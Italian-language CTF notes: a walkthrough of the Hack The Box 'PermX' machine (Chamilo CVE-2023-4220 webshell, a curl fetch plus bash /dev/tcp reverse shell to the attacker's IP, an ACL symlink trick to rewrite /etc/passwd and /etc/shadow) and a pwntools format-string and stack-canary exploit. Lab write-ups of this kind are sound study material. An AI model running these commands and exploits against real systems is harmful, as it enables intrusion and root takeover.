```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
# Scan

Eseguiamo il comando `nmap` per vedere quali porte aperte abbiamo sulla macchina

`nmap -sC -sV 10.10.11.23`

troviamo le porte 22 80 aperte

# Enumerazione

Navighiamo sulla pagina web, e ci troviamo davanti una pagina con varie sezioni
Lanciamo gobuster con il comando
`gobuster dir -u "http://permx.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

Per vedere quali sottodirectory utili abbiamo.

Non troviamo nulla di interessante, quindi passiamo all'enumerazione dei `vhost` con `FFUZ`, usando il comando :
`ffuf -u http://permx.htb -H "Host:FUZZ.permx.htb" -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -fw 18` 

Questo comando mi ritorna due vhost interessanti, ovvero `lms` e `www`
# Vhost LMS

Una volta aperto il sito web `http://lms.permx.htb` ci troviamo davanti a una pagina di login

![[photo_3_2024-09-10_13-07-00 1.jpg|center]]

Proviamo subito ad effettuare un'attacco `SQL Injection`, con scarsi risultati

Proviamo quindi a fare bruteforce tramite il tool `Hydra`, con il comando 
`hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt lms.permx.htb http-post-form "/index.php:username=^USER^&password=^PASS^:loginFailed=1"`

Ma non ci ritorna nulla

A questo punto provo a fare enumerazione con gobuster, e mi trova due sottodirectory interessanti, ovvero app e documentation

Nella cartella `documentation` troviamo la documentazione relativa a Chamilo, che ci dice quale versione sta attualmente girando sul sistema

A questo punto,dato che hydra non funziona, sql injection non funziona e gobuster non trova nulla di interressante, cerchiamo online se esiste un exploit relativo a Chamelio.

Troviamo qualcosa di molto interessante, ovvero la vulnerabilità `CVE-2023-4220`, che si può utilizzare se la versione è $\leq 1.11.24$.

La nostra versione la abbiamo trovata in documentation, ed è la 1.11, quindi possiamo lanciare l'attacco tramite CVE.

# CVE Exploit

Cercando online troviamo questa repository di github che ci permette di eseguire l'exploit -> [Repo Exploit](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)

![[Screenshot_2024-09-10_12_33_53.png|center]]

Dalla foto vediamo anche i dettagli della CVE in questione

Seguiamo i passagi trovati su github e lanciamo lo script che ci va a creare una webshell, che possiamo usare per caricare la nostra reverse shell

La webshell viene creata al seguente indirizzo
`http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?cmd=<command>`

Al posto di command lanciamo il comando che a noi interessa, ovvero 
`curl http://<mio_ip>:<porta>/shell.sh -o shell.sh`, in modo da caricare il file shell.sh sul sito

il file shell.sh contiene le seguenti righe di codice

```shell
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORTA> 0>&1'
```

Una volta caricata la nostra shell.sh, prendiamo la shell tramite l'utilizzo di netcat e otteniamo l'accesso con l'utente www-data.

# User WWW-DATA & PrivEsc

A questo punto, carichiamo il file `linpeas.sh` e lo eseguiamo

Linpeas trova una sequenza di codice PHP, dove vengono specificati utente e password per l'accesso al dabatase, però non sappaimo dove si trova il file completo

![[photo_2_2024-09-10_13-07-00.jpg|center]]

Per trovare il file lanciamo il comando 
`find /var/www/chamilo/ -name configuration* 2>/dev/null` 

e troviamo due file:
`/var/www/chamilo/app/config/configuration.php
`/var/www/chamilo/plugin/sepe/src/configuration.php`

Nel primo file troviamo le configurazioni 
`db_user = "chamilo" e db_pass = "03F6lY3uXAP2bkW8"`

Nel secondo nulla di interessante

A questo punto proviamo ad accedere al DB usando queste credenziali e ci troviamo davanti la seguente situazione

![[photo_4_2024-09-10_13-07-00.jpg|center]]

![[photo_1_2024-09-10_13-07-00.jpg|center]]

Otteniamo l'hash delle password di due utenti, `Admin` e `Anon`, ma nessuno dei due utenti serve realmente.
Infatti i due hash non possono essere convertiti.

A questo punto, ricordando la porta 22 aperta sulla macchina, proviamo ad accedere tramite ssh tramite queste credenziali.

Proviamo l'user chamilo, ma non ci fa entrare, a questo punto proviamo l'user `mtz`, che avevamo trovato in precedenza dalla cartella home

## User MTZ

Ora siamo l'utente mtz, e usando il comando `sudo -l` notiamo che possiamo lanciare il file `/opt/acl.sh` con i permessi di root. (Cosa poi confermata rilanciando linpeas.sh)

Il file usa il comando `setfacl` per modficare la `access control list` e modificare quindi i permessi di un dato file

A questo punto lo possiamo usare per modificare i file `/etc/passwd` e `/etc/shadow` in modo da creare un nostro utente root custom

Per fare ciò bisogna prima di tutto creare del link simbolici ai due file, perchè se passati cosi al file ac.sh ci verrà restituito l'errore Acces Denied.

I comandi sono : 
```shell
ln -s /etc/passwd /home/mtz/passwd_link
ln -s /etc/shadow /home/mtz/shadow_link
```

Fatto questo eseguiamo il file acl.sh, passando in input i due link simbolici, in questo modo avremo libero accesso in scrittura ai due file passwd e shadow.

A questo punto creaimo il nostro nuovo utente root custom (es. mia_root), e una volta caricate le voci nei due file potremmo entrare come root usando il comando 

`su mia_root`

Fatto ciò saremo utente root, e potremmo prendere la root_flag

---
# Esercizio age_calculator_pro

L'esercizio prevede una format string per scovare lo stack canaries, poi buffer overflow per ottenere la shell (tramite utilizzo della funzione win)

il payload è il seguente 

`payload=b"A"*0x48+p64(canary_sp_int)+b"B"*8+p64(0x004011f6)`

dove : 
- `b"A"*0x48` indica la distanza fra il canary e l'inizio del nostor input, trovato in questo modo
	- l'offset è trovato cosi hex(`<Indirizzo Canary>`-`<Indirizzo input>`) dove il primo indirizzo è lo stack del canary e il secondo quello dell'input
- `canary_sp_int` è il leak dello stack canary
- `b"B"*0x8` : quel numeor sta ad indicare quanti bytes (8) si sovrappongono tra il canary e la printf, infatti da gdb possiamo vedere che tra canary e printf ci sta un solo spazio vuoto
- `0x004011f6` indirizzo della funzione win, trovato con Ghidra
## Posizione del Canary nello Stack

Il canary si trova tipicamente in una posizione tra le variabili locali e l'indirizzo di ritorno (il **return address**). Questo avviene per proteggere l'integrità della funzione da attacchi di **buffer overflow**. La posizione precisa (in questo caso la posizione 17) dipende da vari fattori legati all'organizzazione della memoria dello stack da parte del compilatore.

1. **Calling Conventions**: Le **calling conventions** sono regole che definiscono come i parametri vengono passati alle funzioni, come viene gestito lo stack, e come vengono salvati i registri. Le convenzioni possono influenzare la struttura dello stack, ma non determinano direttamente la posizione del canary. La loro principale funzione è stabilire l’ordine di chiamata dei parametri, il salvataggio del **frame pointer** (se usato), e il ritorno al chiamante.
2. **Allineamento e Padding**: Il motivo per cui il canary si trova alla posizione 17 può essere legato all'allineamento della memoria e al padding inserito dal compilatore. Per ragioni di efficienza, le variabili locali vengono allocate in memoria seguendo regole di allineamento (spesso a multipli di 8 o 16 byte su architetture a 64 bit). Queste regole possono introdurre "spazi vuoti" (padding) nello stack, spostando di fatto il canary più in alto o in basso.
3. **Dimensione delle Variabili Locali**: Se hai un buffer di una certa dimensione e altre variabili locali, queste occupano un certo spazio nello stack. Il canary viene posizionato dopo queste variabili per prevenire overflow e potrebbe trovarsi alla posizione 17 a causa della quantità di spazio richiesto da queste variabili.
4. **Effetto delle Calling Conventions**: Le calling conventions, in questo contesto, non influenzano direttamente la posizione del canary. Esse determinano come i parametri vengono gestiti nello stack e dove vengono salvati i registri, ma la posizione del canary è influenzata maggiormente dall’organizzazione delle variabili locali, dall’allineamento della memoria e dalle decisioni del compilatore su come strutturare lo stack.

### Perché il Canary è a Posizione 17?

La posizione 17 è una conseguenza del modo in cui il compilatore organizza le variabili nello stack, tenendo conto di:

- La dimensione del buffer e delle altre variabili locali.
- La presenza di eventuali spazi di padding per mantenere l’allineamento della memoria.
- La necessità di inserire il canary prima del return address per verificare se il buffer è stato corrotto.

Quindi, la **calling convention** non determina la posizione esatta del canary, ma gioca un ruolo indiretto nella disposizione generale dello stack. Il canary si trova in quella posizione principalmente per il modo in cui il compilatore ha deciso di organizzare le variabili e applicare l'allineamento della memoria.

Per capire in che posizione dello stack trovare il canary, potevamo fare questa cosa : 

- Una volta eseguito il programma, in faso di input dovevamo mettere questa sequenza di selettori `%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`
- Una volta messo in input questa sequenza, ci troveremo con un output molto particolare. Da questo possiamo prendere il canary, dato che è l'unico indirizzo di 9 byte, di cui **8 sono casuali** e **l'ultimo è il byte nullo**

Es.

Un possibile output : 
`0x7f37a1704963.(nil).0x7f37a17048e0.(nil).(nil).0x8c00000006.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x70252e.0x7ffc78527300.0xb123d6c61ae59400.0x1.0x7f37a1551dba.0x7ffc78527330`

Il canary, seguendo la descrizione di prima, sarà `0xb123d6c61ae59400`, che si trova in posizione 17

## Exploit

L'exploit è il seguente

```python
from pwn import *

ARG = "%17$lx"

p = remote("agecalculatorpro.challs.olicyber.it",38103)

p.recvuntil("What's your name?")

p.sendline(ARG)

p.recvline()

canary = p.recvline().strip()

print(canary)

canary_sp = canary.split(b",")

print(canary_sp[0])  

canary_sp_int = int(canary_sp[0],16)

print(canary_sp_int)

p.sendline(b"A"*0x48+p64(canary_sp_int)+b"B"*8+p64(0x004011f6))

p.interactive()
```

## Altro metodo per canary

da gdb, lanciare il comando `x/x $fs_base+0x28` se l'architettura è a 64 bit